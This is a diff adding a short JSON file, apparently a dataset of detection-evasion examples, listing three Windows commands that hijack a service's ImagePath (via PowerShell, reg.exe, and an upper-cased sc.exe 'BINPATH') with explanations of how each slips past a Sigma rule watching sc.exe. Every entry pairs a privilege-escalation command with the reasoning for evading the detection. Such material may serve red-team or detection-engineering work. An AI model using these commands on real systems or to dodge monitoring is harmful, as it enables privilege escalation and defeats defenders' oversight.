@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WeakService' -Name 'ImagePath' -Value 'C:\\temp\\exploit.exe'\"",
+    "explanation": "The Sigma rule specifically monitors the execution of 'sc.exe' with 'config' and 'binPath' arguments. This bypass avoids 'sc.exe' entirely by using PowerShell to modify the service's configuration directly in the Windows Registry, achieving the same privilege escalation goal without triggering the process-based detection."
+  },
+  {
+    "output": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\TargetService\" /v ImagePath /t REG_EXPAND_SZ /d \"C:\\pwned.exe\" /f",
+    "explanation": "Similar to the PowerShell bypass, this command uses the native 'reg.exe' utility to overwrite the service binary path. Since the detection logic is strictly bound to the 'sc.exe' image name and its specific command-line strings, direct registry manipulation remains undetected by this rule."
+  },
+  {
+    "output": "sc.exe config \"WeakService\" BINPATH= \"C:\\temp\\mal.exe\"",
+    "explanation": "This is a simple case-sensitivity or formatting bypass depending on the SIEM's parser. While the rule uses 'contains', some legacy or poorly configured engines might look for exact 'binPath' casing. Using 'BINPATH' (all caps) or adding unexpected whitespace can sometimes evade simple string-matching filters."
+  }
+]
